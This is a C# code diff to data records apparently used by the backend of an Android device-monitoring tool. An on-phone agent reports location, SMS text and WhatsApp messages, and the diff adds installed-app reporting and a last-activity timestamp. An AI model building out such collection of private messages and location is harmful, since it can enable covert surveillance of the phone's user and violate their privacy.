@@ -21,7 +21,7 @@ public record RegisterDeviceRequest(
     [Required] string Name
 );
 
-public record DeviceResponse(int Id, string Name, string DeviceToken, DateTime RegisteredAt);
+public record DeviceResponse(int Id, string Name, string DeviceToken, DateTime RegisteredAt, long? LastActivityAt);
 
 // ── Agent payloads (from Android) ─────────────────────────────────────────────
 public record LocationPayload(double Latitude, double Longitude, float Accuracy, long Timestamp);
@@ -51,3 +51,8 @@ public record SmsDto(string Address, string Body, long Date, int Type);
 public record WhatsAppDto(string AppPackage, string AppName, string? AppIcon, string Sender, string Message, long Timestamp);
 
 public record WhatsAppChatDto(string Chat, string Sender, string Message, long Timestamp);
+
+// ── Installed Apps ────────────────────────────────────────────────────────────
+public record InstalledAppPayload(string PackageName, string AppName, string Version, long InstalledAt, string? IconBase64);
+
+public record InstalledAppDto(string PackageName, string AppName, string Version, long InstalledAt, long LastSeenAt, string? IconBase64);
